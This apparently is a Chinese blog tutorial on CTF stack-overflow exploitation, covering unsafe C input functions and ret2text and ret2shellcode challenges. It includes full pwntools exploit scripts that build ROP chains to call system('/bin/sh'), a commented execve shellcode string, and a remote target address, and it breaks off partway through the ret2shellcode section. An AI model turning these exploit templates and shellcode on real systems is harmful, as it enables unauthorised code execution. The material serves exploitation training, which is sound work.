@@ -1,0 +1,652 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>栈溢出从入门到放弃4 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一、初级栈溢出系列从现在开始温习栈溢出，从初级栈溢出到高级栈溢出到花式栈溢出都重温一遍，主要结合题目练习加深巩固。
+一般来说，实现栈溢出，都是因为读入的字节数超过了buf允许的大小，导致ret地址被,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">栈溢出从入门到放弃4</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%833/" title="栈溢出从入门到放弃4" class="">栈溢出从入门到放弃4</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    61k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    56 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/stack/" rel="tag">stack</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h3 id="一、初级栈溢出系列"><a href="#一、初级栈溢出系列" class="headerlink" title="一、初级栈溢出系列"></a>一、初级栈溢出系列</h3><p>从现在开始温习栈溢出，从初级栈溢出到高级栈溢出到花式栈溢出都重温一遍，主要结合题目练习加深巩固。</p>
+<p>一般来说，实现栈溢出，都是因为读入的字节数超过了buf允许的大小，导致ret地址被覆盖，我们的最终目标都是实现调用system(“/bin/sh”)函数去getshell，过程花样可以千奇百怪，但是总有规律可以寻找~</p>
+<h4 id="1、第一步找危险函数。"><a href="#1、第一步找危险函数。" class="headerlink" title="1、第一步找危险函数。"></a>1、第一步找危险函数。</h4><p>输入函数：</p>
+<p>gets(&amp;buf) 直接读取一行，忽略’\x00’ ，一看没有字符数的限制，那肯定是200%的溢出~</p>
+<p>read(0，&amp;buf，0x40)   buf的大小为0x20，说明可以溢出0x20个字节，够ret覆盖了~</p>
+<p>scanf(%s，&amp;buf)     这里也一样，没有控制输入的字符数，造成溢出。</p>
+<p>vscanf(%s，&amp;buf)   和scanf函数差不多，原理类似</p>
+<p>copy函数：</p>
+<p>sprintf(buf1, buf2)  将buf2中的字符串拷贝到buf1中，这里一旦buf2大小比buf1大，就可以栈溢出了 </p>
+<p>strcpy(buf1，buf2)   字符串复制，遇到’\x00’停止 ，原理同上</p>
+<p>strcat(buf1，buf2)   字符串拼接，遇到’\x00’停止 ，将buf2中的字符串拼到buf1中的字符串，存在buf1中，栈溢出举例：4+3=7&gt;4(数字表示buf大小)</p>
+<p>bcopy( s,d,6 )：从d中复制6字节到s中，这里d和s都是指针，内存复制，bcopy不检查字符串中的空字节NULL，函数没有返回值。 </p>
+<p>memcpy(dest, src, strlen(src))：原理和bcopy差不多，内存拷贝 </p>
+<p>讲到%的格式化，顺便脑补下C知识：</p>
+<p>格式字符           说明</p>
+<p> %a                 读入一个浮点值(仅C99有效) </p>
+<p> %A                 同上 </p>
+<p> %c                 读入一个字符  </p>
+<p>%d                 读入十进制整数  </p>
+<p>%i                 读入十进制，八进制，十六进制整数  </p>
+<p>%o                 读入八进制整数  </p>
+<p>%x                 读入十六进制整数  </p>
+<p>%X                 同上  </p>
+<p>%c                 读入一个字符 </p>
+<p> %s                 读入一个字符串  </p>
+<p>%f                 读入一个浮点数 </p>
+<p> %F                 同上  </p>
+<p>%e                 同上 </p>
+<p> %E                 同上 </p>
+<p> %g                 同上 </p>
+<p> %G                 同上  </p>
+<p>%p                 读入一个指针，一旦是地址</p>
+<p> %u                 读入一个无符号十进制整数  </p>
+<p>%n                 至此已读入值的等价字符数  </p>
+<p>%[]                扫描字符集合  </p>
+<p>%%                 读%符号  </p>
+<p>知道了漏洞函数，接着就是利用栈溢出漏洞去实现getshell了。</p>
+<h4 id="2、第二步制定方法"><a href="#2、第二步制定方法" class="headerlink" title="2、第二步制定方法"></a>2、第二步制定方法</h4><p>以下就是基础rop技术一览：</p>
+<h3 id="1、ret2text"><a href="#1、ret2text" class="headerlink" title="1、ret2text"></a>1、ret2text</h3><p>链接：<a href="https://pan.baidu.com/s/1Vz5j2Z4rBHOj2AJbfv-wpA" target="_blank" rel="noopener">https://pan.baidu.com/s/1Vz5j2Z4rBHOj2AJbfv-wpA</a><br>提取码：2gok </p>
+<p>原理：题目中有现成的backdoor函数，直接ret到这个位置</p>
+<p>做题的一般顺序：先checksec检查下保护机制:</p>
+<p><img src="/blog_img/1561904205365.png" alt="1561904205365"></p>
+<p>只开了一个堆栈不可执行的保护，去ida分析一波逻辑：</p>
+<p><img src="/blog_img/1561904557996.png" alt="1561904557996"></p>
+<p>一看是gets函数，栈溢出，然后栈大小是0x64（一般没有错，但是有时会骗人的，还是用cyclic方法去看，2步）</p>
+<h4 id="1、cyclic-n-生成一串有规律的垃圾字符n个，用于确定报错的地址偏移-4个为一个单位）"><a href="#1、cyclic-n-生成一串有规律的垃圾字符n个，用于确定报错的地址偏移-4个为一个单位）" class="headerlink" title="1、cyclic  n(生成一串有规律的垃圾字符n个，用于确定报错的地址偏移,4个为一个单位）"></a>1、cyclic  n(生成一串有规律的垃圾字符n个，用于确定报错的地址偏移,4个为一个单位）</h4><p><img src="/blog_img/1561904583168.png" alt="1561904583168"></p>
+<h4 id="2、cyclic-l-报错地址（会返回ret地址的偏移）"><a href="#2、cyclic-l-报错地址（会返回ret地址的偏移）" class="headerlink" title="2、cyclic  -l  报错地址（会返回ret地址的偏移）"></a>2、cyclic  -l  报错地址（会返回ret地址的偏移）</h4><p><img src="/blog_img/1561904713539.png" alt="1561904713539"></p>
+<p>确认出票偏移为112(覆盖了ebp的)</p>
+<p>再看下后门函数，这里直接看到有，如果函数名被混淆了，一般可以通过shift+F12找system和参数/bin/sh：</p>
+<p><img src="/blog_img/1561904729434.png" alt="1561904729434"></p>
+<p><img src="/blog_img/1561905264665.png" alt="1561905264665"></p>
+<p>这里看到有，然后一步步看调用位置（ctrl+x）,找到代码块的位置即可，就是前面找到的secure那里。继续分析，</p>
+<p>根本不用管前面的随机数输入匹配，直接绕过，调到system函数执行即可，这就是ROPgadget的巧妙利用，指哪里就去哪里执行代码：</p>
+<p><img src="/blog_img/1561904755007.png" alt="1561904755007"></p>
+<p>直接上exp:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#coding=utf8</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF('./ret2text')</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process('./ret2text')</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote('116.85.48.105',5005)</span><br><span class="line">    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line">sl = lambda s : p.sendline(s)</span><br><span class="line">sd = lambda s : p.send(s)</span><br><span class="line">rc = lambda n : p.recv(n)</span><br><span class="line">ru = lambda s : p.recvuntil(s)</span><br><span class="line"></span><br><span class="line">back_door = <span class="number">0x804863A</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += 'a'*112</span><br><span class="line">payload += p32(back_door)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1561904872010.png" alt="1561904872010"></p>
+<p>getshell后是可以ls提取出当前目录的内容的~</p>
+<p>总结：先找函数，看看有没有后门函数可以直接调用(可以shift+F12查看字符串查找system和参数/bin/sh)，如果有，直接用，没有则换其他思路做，有时是有system函数，但是参数不对，这时就是自己写入参数，然后搞到参数的地址带入进去，见下面的题：</p>
+<h4 id="ret2text2："><a href="#ret2text2：" class="headerlink" title="ret2text2："></a>ret2text2：</h4><p>链接：<a href="https://pan.baidu.com/s/1ek9WwrpuuOlLL-zDd3RQXA" target="_blank" rel="noopener">https://pan.baidu.com/s/1ek9WwrpuuOlLL-zDd3RQXA</a><br>提取码：0515 </p>
+<p>cheksec：</p>
+<p><img src="/blog_img/1561968624676.png" alt="1561968624676"></p>
+<p>ida分析一波：</p>
+<p><img src="/blog_img/1561965357300.png" alt="1561965357300"></p>
+<p><img src="/blog_img/1561967293400.png" alt="1561967293400"></p>
+<p>简单的栈溢出，栈大小为0x10（不包含ebp）找后门：</p>
+<p><img src="/blog_img/1561967318828.png" alt="1561967318828"></p>
+<p>参数不对，这时到data数据域去找有用的命令：/bin/sh\x00、/sh\x00、$0一般常用的是这三个command.</p>
+<p><img src="/blog_img/1561967405396.png" alt="1561967405396"></p>
+<p>找到$0，于是ida右键转成data：</p>
+<p><img src="/blog_img/1561967440890.png" alt="1561967440890"></p>
+<p>这里把地址搞到：0x601070</p>
+<p>那么接着就是用到pop_rdi_ret去填充参数了：这里ROPgadget  –binary  文件名  –only  “pop|ret(或者其他想要的gadget)”是专用的命令：</p>
+<p><img src="/blog_img/1561967613928.png" alt="1561967613928"></p>
+<p>接下来直接上exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#coding=utf8</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF('./ret2text2_64')</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process('./ret2text2_64')</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote('116.85.48.105',5005)</span><br><span class="line">    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line"><span class="meta">#onegadget(libc.6.so)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="meta">#shellcode=<span class="meta-string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span></span><br><span class="line"><span class="meta">#addr = u64(rc(6).ljust(8,<span class="meta-string">'\x00'</span>))</span></span><br><span class="line"><span class="meta">#addr = u32(rc(4))</span></span><br><span class="line"><span class="meta">#addr = int(rc(6),16)#string</span></span><br><span class="line">sl = lambda s : p.sendline(s)</span><br><span class="line">sd = lambda s : p.send(s)</span><br><span class="line">rc = lambda n : p.recv(n)</span><br><span class="line">ru = lambda s : p.recvuntil(s)</span><br><span class="line"></span><br><span class="line">def debug(addr,PIE=True):</span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = <span class="keyword">int</span>(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.<span class="built_in">attach</span>(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line">def bk(addr):</span><br><span class="line">	gdb.attach(p,'b *'+hex(addr))</span><br><span class="line"></span><br><span class="line">system = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">command = <span class="number">0x601070</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400683</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += 'a'*0x10</span><br><span class="line">payload += 'aaaaaaaa'</span><br><span class="line">payload += p64(pop_rdi_ret)  <span class="comment">//64位第一个参数放rdi寄存器中</span></span><br><span class="line">payload += p64(command)</span><br><span class="line">payload += p64(system)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>总结，没有合适参数时要去data域找找有用的东西，如果还是没有，可以构造命令，写入到bss段中，二次调用去getshell：</p>
+<h4 id="题目：ret2text3-64"><a href="#题目：ret2text3-64" class="headerlink" title="题目：ret2text3_64"></a>题目：ret2text3_64</h4><p>链接：<a href="https://pan.baidu.com/s/1afZKZkqAwejy0YtvGo8rww" target="_blank" rel="noopener">https://pan.baidu.com/s/1afZKZkqAwejy0YtvGo8rww</a><br>提取码：z59w </p>
+<p><img src="/blog_img/1562004160608.png" alt="1562004160608"></p>
+<p><img src="/blog_img/1562004229890.png" alt="1562004229890"></p>
+<p>其他的，没变。这下在程序中找不到/bin/sh了也没有$0了，这可如何是好，没有就自己构造呗~</p>
+<p>说干就干，直接在bss段中写入我们的command（“/bin/sh”），然后获取bss段的地址即可~</p>
+<p>具体操作是借助rop链搭建起来：</p>
+<p><img src="/blog_img/1562004369348.png" alt="1562004369348"></p>
+<p>找到64位的第一个参数存放位置，rdi寄存器。</p>
+<p>接着思路清晰，上exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./ret2text3_64'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./ret2text3_64'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget(libc.6.so)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"><span class="comment">#addr = u64(rc(6).ljust(8,'\x00'))</span></span><br><span class="line"><span class="comment">#addr = u32(rc(4))</span></span><br><span class="line"><span class="comment">#addr = int(rc(6),16)#string</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">	gdb.attach(p,<span class="string">'b *'</span>+hex(addr))</span><br><span class="line"></span><br><span class="line">bss_start = elf.bss()</span><br><span class="line">pop_rdi_ret = <span class="number">0x400683</span></span><br><span class="line">gets = elf.symbols[<span class="string">"gets"</span>]</span><br><span class="line">system = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += <span class="string">'aaaaaaaa'</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bss_start)</span><br><span class="line">payload += p64(gets)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bss_start)</span><br><span class="line">payload += p64(system)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">"/bin/sh\x00"</span>)    //作为我们的命令写在bss中</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>32位的程序也演示一波吧：</p>
+<h4 id="ret2text3-32"><a href="#ret2text3-32" class="headerlink" title="ret2text3_32"></a>ret2text3_32</h4><p>链接：<a href="https://pan.baidu.com/s/1J4sHK-Pfy46utGIrocTihA" target="_blank" rel="noopener">https://pan.baidu.com/s/1J4sHK-Pfy46utGIrocTihA</a><br>提取码：kq4c </p>
+<p><img src="/blog_img/1562004703941.png" alt="1562004703941"></p>
+<p><img src="/blog_img/1562004745572.png" alt="1562004745572"></p>
+<p>后门函数：</p>
+<p><img src="/blog_img/1562004760532.png" alt="1562004760532"></p>
+<p>然后找不到合适的参数，只能自己构造：</p>
+<p><img src="/blog_img/1562005005305.png" alt="1562005005305"></p>
+<p>这里能用到的rop链子选pop ebx；ret，主要作用是维持栈平衡，exp差不多：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./ret2text3_32'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./ret2text3_32'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget(libc.6.so)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"><span class="comment">#addr = u64(rc(6).ljust(8,'\x00'))</span></span><br><span class="line"><span class="comment">#addr = u32(rc(4))</span></span><br><span class="line"><span class="comment">#addr = int(rc(6),16)#string</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">	gdb.attach(p,<span class="string">'b *'</span>+hex(addr))</span><br><span class="line"></span><br><span class="line">bss_start = elf.bss()</span><br><span class="line">pop_ebx_ret = <span class="number">0x0804843d</span></span><br><span class="line">gets = elf.symbols[<span class="string">"gets"</span>]</span><br><span class="line">system = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment">#方法一</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">112</span></span><br><span class="line">payload += p32(gets)</span><br><span class="line">payload += p32(pop_ebx_ret)        <span class="comment">#维持栈平衡，确保下一条要执行的指令是system</span></span><br><span class="line">payload += p32(bss_start)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(bss_start)</span><br><span class="line"></span><br><span class="line"><span class="comment">#方法二，根据参数入栈规律自己思考可行性</span></span><br><span class="line"><span class="comment">#payload = ''</span></span><br><span class="line"><span class="comment">#payload += 'a'*112</span></span><br><span class="line"><span class="comment">#payload += p32(gets)</span></span><br><span class="line"><span class="comment">#payload += p32(system)</span></span><br><span class="line"><span class="comment">#payload += p32(bss_start)</span></span><br><span class="line"><span class="comment">#payload += p32(bss_start)</span></span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>32位的参数的位置有所不同，注意看清楚~</p>
+<h3 id="2、ret2shellcode"><a href="#2、ret2shellcode" class="headerlink" title="2、ret2shellcode"></a>2、ret2shellcode</h3><p>链接：<a href="https://pan.baidu.com/s/1nHCoNxT6D9u1kC1qkUmPMA" target="_blank" rel="noopener">https://pan.baidu.com/s/1nHCoNxT6D9u1kC1qkUmPMA</a><br>提取码：xlx0 </p>
+<p>shellcode是什么？它是一串能够让我们getshell的代码，相当于一个包装好的system(“/bin/sh”)代码，直接执行这段代码，就相当于执行system函数一样，很快，很方便，那么首先我们得有shellcode，然后栈溢出跳到shellcode的位置去执行shellcode即可:</p>
+<p><img src="/blog_img/1561970629638.png" alt="1561970629638"></p>
+<p>这里可以知道，有个可读可写可执行的区域，猜测是bss段：</p>
+<p><img src="/blog_img/1561970759203.png" alt="1561970759203"></p>
+<p><img src="/blog_img/1561970778696.png" alt="1561970778696"></p>
+<p>所以我们的bss段是有可执行的权限的，那么往bss段写入shellcode是可以执行的~</p>
+<p><img src="/blog_img/1561970582261.png" alt="1561970582261"></p>
+<p>而且copy函数时把我们的输入copy0x64个字节到buf2（bss段），所以策略很明显，直接输入shellcode，然后ret地址填bss段地址。</p>
+<p>这里直接cyclic爆破出栈大小112（包含ebp）</p>
